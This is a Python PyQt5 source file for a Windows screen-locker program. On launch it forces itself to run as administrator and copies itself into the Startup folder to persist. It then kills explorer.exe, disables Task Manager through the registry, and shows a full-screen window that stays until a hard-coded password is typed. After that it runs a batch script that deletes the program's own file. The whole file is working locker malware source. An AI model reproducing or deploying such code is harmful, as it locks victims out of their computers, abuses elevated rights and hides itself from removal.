from PyQt5 import QtCore, QtGui, QtWidgets
import sys
import winreg
from PyQt5.QtGui import QPixmap
import os
from winreg import *
import ctypes 
class DisableTaskMgr:
    def __init__(self):
        self.key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        self.key_name = "DisableTaskMgr"
    def __call__(self,key):
        self.keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(self.keys, self.key_name, 0, winreg.REG_DWORD, key)
        winreg.CloseKey(self.keys)
Disable=DisableTaskMgr()
class Ui_MainWindow:
    def setupUi(self, MainWindow):
        MainWindow.setWindowFlag(QtCore.Qt.FramelessWindowHint)
        MainWindow.setObjectName("MainWindow")
        MainWindow.setFixedSize(1510, 800)  
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")


        self.background_label = QtWidgets.QLabel(self.centralwidget)
        self.background_label.setGeometry(QtCore.QRect(0, 0, 1510, 800))  
        self.background_label.setPixmap(QPixmap(":/shinde/main.jpg")) 
        self.background_label.setScaledContents(True)  
        self.toolButton = QtWidgets.QToolButton(self.centralwidget)
        self.toolButton.setGeometry(QtCore.QRect(600, 180, 141, 51))
        self.toolButton.setObjectName("toolButton")
        self.toolButton.clicked.connect(self.password)
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(150, 190, 371, 31))
        self.lineEdit.setObjectName("lineEdit")

        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.toolButton.setText(_translate("MainWindow", "确定"))
    def password(self):
        self.line=self.lineEdit.text()
        if self.line == "20010202":
            os.popen('explorer.exe')
            Disable(0)
            startup.close()
            sys.exit()
        else:
            pass
        
    
import shinde_rc
class startup:
    delete='''
@echo off
pause
del /f /s /q {0}
del %0
'''.format(sys.argv[0])
    cwd=r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\{1}\Programs\Startup".format(os.getlogin(),'Start Menu')
    @classmethod
    def open(cls):
        if os.getcwd()!=startup.cwd:
            with open(sys.argv[0],'rb') as files:
                suojiread=files.read()
                with open(startup.cwd+r'\suoji.exe','wb') as wfile:
                    wfile.write(suojiread)  
    @classmethod
    def close(cls):
        with open('delete.cmd','w') as script:
            script.write(delete)
        os.popen('delete.cmd')
def add_runas():
    exe_path = sys.executable
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_path, __file__, None, 1)
    reg_path = r"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
    reg_key = OpenKey(HKEY_CURRENT_USER, reg_path, access=KEY_SET_VALUE | KEY_READ)
    runas_value = "~ RUNASADMIN"
    try:
        value = QueryValueEx(reg_key, exe_path)
    except FileNotFoundError:
        SetValueEx(reg_key, exe_path, 0, REG_SZ, runas_value)
    else:
        if runas_value[2:] not in value[0]:
            SetValueEx(reg_key, exe_path, 0, REG_SZ, value[0] + ' ' + runas_value[2:])    
def main():
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ex = Ui_MainWindow()
    ex.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    add_runas()
    startup.open()
    os.system('taskkill /f /im explorer.exe')
    Disable(1)
    main()

    
